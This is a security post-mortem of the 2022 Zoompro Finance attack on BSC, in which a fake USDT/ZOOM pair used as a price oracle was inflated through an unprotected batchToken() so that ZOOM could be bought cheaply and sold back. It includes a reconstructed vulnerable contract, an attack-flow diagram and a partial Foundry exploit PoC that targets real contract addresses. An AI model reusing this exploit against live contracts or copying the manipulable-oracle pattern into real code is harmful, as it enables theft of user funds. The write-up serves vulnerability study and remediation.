# ZoomproFinance — Fake USDT Pair Injection Price Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-09 |
| **Protocol** | Zoompro Finance (ZOOM) |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **Attack Tx** | [0xe176bd9cfefd40dc03508e91d856bd1fe72ffc1e9260cd63502db68962b4de1a](https://bscscan.com/tx/0xe176bd9cfefd40dc03508e91d856bd1fe72ffc1e9260cd63502db68962b4de1a) |
| **Attacker** | [0xc578d755cd56255d3ff6e92e1b6371ba945e3984](https://bscscan.com/address/0xc578d755cd56255d3ff6e92e1b6371ba945e3984) |
| **Attack Contract** | [0xb8d700f30d93fab242429245e892600dcc03935d](https://bscscan.com/address/0xb8d700f30d93fab242429245e892600dcc03935d) |
| **KIMO/WBNB Pair** | [0x7EFaEf62fDdCCa950418312c6C91Aef321375A00](https://bscscan.com/address/0x7EFaEf62fDdCCa950418312c6C91Aef321375A00) |
| **Swap Contract** | [0x5a9846062524631C01ec11684539623DAb1Fae58](https://bscscan.com/address/0x5a9846062524631C01ec11684539623DAb1Fae58) |
| **Batch Token** | [0x47391071824569F29381DFEaf2f1b47A4004933B](https://bscscan.com/address/0x47391071824569F29381DFEaf2f1b47A4004933B) |
| **Fake USDT** | [0x62D51AACb079e882b1cb7877438de485Cba0dD3f](https://bscscan.com/address/0x62D51AACb079e882b1cb7877438de485Cba0dD3f) |
| **Fake USDT/ZOOM Pair** | [0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5](https://bscscan.com/address/0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5) |
| **ZOOM Token** | [0x9CE084C378B3E65A164aeba12015ef3881E0F853](https://bscscan.com/address/0x9CE084C378B3E65A164aeba12015ef3881E0F853) |
| **Root Cause** | The protocol trusted a fake USDT/ZOOM pair as a price oracle, using it as the pricing reference for `buy()`/`sell()` |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-09/ZoomproFinance_exp.sol) |

---
## 1. Vulnerability Overview

Zoompro Finance determined the buy/sell price of the ZOOM token based on the reserve ratio of a fake USDT/ZOOM pair referenced by the internal Swap contract. The attacker used approximately 3 million USDT flash-borrowed from the KIMO/WBNB pair to inject a large amount of Fake USDT into the fake USDT/ZOOM pair, then called `batchToken()` and `sync()` to artificially suppress the ZOOM price. In this state, they purchased a large quantity of ZOOM at a deflated price via `buy()`, then realized a profit by selling at the normal price via `sell()`.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable Swap Contract - uses fake pair as price oracle
contract ZoomSwap {
    // Reads ZOOM price from fake FakeUSDT/ZOOM pair
    IUniPair public priceOracle; // = FakeUSDT/ZOOM pair (0x1c7ecBfc...)

    function getZoomPrice() public view returns (uint256) {
        // ❌ Uses spot price from a manipulable pair
        (uint112 r0, uint112 r1, ) = priceOracle.getReserves();
        // r0 = FakeUSDT reserve, r1 = ZOOM reserve
        return uint256(r0) * 1e18 / uint256(r1);
    }

    function buy(uint256 usdtAmount) external {
        uint256 price = getZoomPrice(); // ❌ Manipulated price
        uint256 zoomOut = usdtAmount * 1e18 / price;
        // When price is low (due to large FakeUSDT injection), zoomOut becomes very large
        ZOOM.transfer(msg.sender, zoomOut);
        USDT.transferFrom(msg.sender, address(this), usdtAmount);
    }

    function sell(uint256 zoomAmount) external {
        uint256 price = getZoomPrice();
        uint256 usdtOut = zoomAmount * price / 1e18;
        ZOOM.transferFrom(msg.sender, address(this), zoomAmount);
        USDT.transfer(msg.sender, usdtOut);
    }
}

// ❌ batchToken() - directly manipulates the fake pair's reserves
contract BatchToken {
    function batchToken(address pair, uint256 amount) external {
        // ❌ No access control — inflates reserves of an arbitrary pair
        fakeUSDT.mint(pair, amount);
        // or fakeUSDT.transfer(pair, amount)
    }
}

// ✅ Correct pattern - use a trusted external oracle
contract SafeZoomSwap {
    AggregatorV3Interface public chainlinkFeed;

    function getZoomPrice() public view returns (uint256) {
        // ✅ Uses an external oracle such as Chainlink
        (, int256 price, , uint256 updatedAt, ) = chainlinkFeed.latestRoundData();
        require(block.timestamp - updatedAt <= 3600, "Stale");
        return uint256(price);
    }
}
```


### On-Chain Source Code

Source: Source unconfirmed

> ⚠️ No on-chain source code — only bytecode exists or source is unverified

**Vulnerable Function** — `buy()`:
```solidity
// ❌ Root cause: The protocol trusted a fake USDT/ZOOM pair as a price oracle, using it as the pricing reference for `buy()`/`sell()`
// Source code unconfirmed — bytecode analysis required
// Vulnerability: The protocol trusted a fake USDT/ZOOM pair as a price oracle, using it as the pricing reference for `buy()`/`sell()`
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash-borrow ~3,000,000 USDT worth from KIMO/WBNB pair
    │       Enter pancakeCall() callback
    │
    ├─[2] Purchase ZOOM tokens with USDT (initial position)
    │       swap.buy(1000 USDT) → receive ZOOM
    │
    ├─[3] Inject 1M FakeUSDT into Fake USDT/ZOOM pair
    │       batchToken(fakeUsdtZoomPair, 1_000_000e18)
    │       ❌ No access control → large-scale fake USDT injection
    │
    ├─[4] Call fakeUsdtZoomPair.sync()
    │       └─ r0(FakeUSDT) spikes → ZOOM price crashes
    │           (FakeUSDT per ZOOM → very low value)
    │
    ├─[5] swap.buy(largeUSDT) → buy large amount of ZOOM at manipulated price
    │       ❌ getZoomPrice() returns manipulated reserves
    │           → obtain large amount of ZOOM for small amount of USDT
    │
    ├─[6] swap.sell(allZOOM) → sell ZOOM at normal or inflated price
    │
    ├─[7] Repay flash loan (0.3% fee)
    │
    └─[8] Net profit: USDT (amount unconfirmed)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface ISwap {
    function buy(uint256 usdtAmount) external;
    function sell(uint256 zoomAmount) external;
}

interface IBatchToken {
    // ❌ Pair token injection function with no access control
    function batchToken(address pair, uint256 amount) external;
}

interface IUniPair {
    function swap(uint256, uint256, address, bytes calldata) external;
    function sync() external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract ZoomproExploit is Test {
    ISwap swap      = ISwap(0x5a9846062524631C01ec11684539623DAb1Fae58);
    IBatchToken bat = IBatchToken(0x47391071824569F29381DFEaf2f1b47A4004933B);
    IUniPair flashPair = IUniPair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IUniPair fakeOracle = IUniPair(0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5);
    IERC20 ZOOM  = IERC20(0x9CE084C378B3E65A164aeba12015ef3881E0F853);
    IERC20 fUSDT = IERC20(0x62D51AACb079e882b1cb7877438de485Cba0dD3f);

    function setUp() public {
        vm.createSelectFork("bsc", 21_055_930);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] ZOOM balance", ZOOM.balanceOf(address(this)), 18);

        // [Step 1] Flash borrow
        (uint112 r0, , ) = flashPair.getReserves();
        flashPair.swap(uint256(r0) * 90 / 100, 0, address(this), abi.encode("exploit"));

        emit log_named_decimal_uint("[End] ZOOM balance", ZOOM.balanceOf(address(this)), 18);
    }

    function pancakeCall(address, uint256 amount0, uint256, bytes calldata) external {
        // [Step 2] Initial ZOOM purchase
        // (call swap.buy() with actual USDT)

        // [Step 3] Inject large amount of FakeUSDT into fake oracle pair
        // ⚡ batchToken(): no access control
        bat.batchToken(address(fakeOracle), 1_000_000 * 1e18);

        // [Step 4] Update fake pair reserves via sync() → ZOOM price crashes
        fakeOracle.sync();

        // [Step 5] Buy large amount of ZOOM at manipulated price
        swap.buy(amount0 / 2); // obtain large amount of ZOOM for small amount of USDT

        // [Step 6] Sell ZOOM
        ZOOM.approve(address(swap), type(uint256).max);
        swap.sell(ZOOM.balanceOf(address(this)));

        // [Step 7] Repay flash loan
        // Repay including fee
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Fake oracle pair manipulation + reserve injection with no access control |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **OWASP DeFi** | Price Oracle Manipulation |
| **Attack Vector** | `batchToken()` → `sync()` → `buy()` at manipulated spot price |
| **Precondition** | Swap contract uses a manipulable fake pair as its oracle |
| **Impact** | ZOOM/USDT drained (amount unconfirmed) |

---
## 6. Remediation Recommendations

1. **Use an independent external oracle**: Use a verified external oracle such as Chainlink, Band Protocol, or Pyth for price determination. Do not use self-created pairs or pairs manipulable via `batchToken()` as oracles.
2. **Access control on `batchToken()`**: Functions that directly inject tokens into a pair must be protected with `onlyOwner` or a whitelist.
3. **Oracle address immutability**: Declare the price oracle address as `immutable` and prevent changes after deployment to guard against a malicious admin replacing the oracle.

```solidity
// ✅ Chainlink-based price oracle
contract SafeZoomSwap {
    AggregatorV3Interface immutable chainlinkUSDT;

    constructor(address _chainlink) {
        chainlinkUSDT = AggregatorV3Interface(_chainlink);
    }

    function getZoomPrice() public view returns (uint256) {
        (, int256 price, , uint256 updatedAt, ) = chainlinkUSDT.latestRoundData();
        require(block.timestamp - updatedAt <= 3600, "Stale price");
        require(price > 0, "Invalid price");
        return uint256(price) * 1e10; // 8 decimals → 18 decimals
    }
}
```

---
## 7. Lessons Learned

- **Dangers of fake tokens/pairs**: Using a protocol's self-created "Fake USDT" or test tokens as a live price oracle is extremely dangerous. Such tokens can be easily manipulated via minting or direct transfers.
- **Oracle trust chain**: The reliability of a price oracle depends on the reliability of the data source it references. If the data source is manipulable, so is the oracle.
- **Recurring pattern in small BSC projects**: The pattern of using fake token pairs as oracles or omitting access control on admin functions like `batchToken()` was found repeatedly in small BSC DeFi projects in 2022.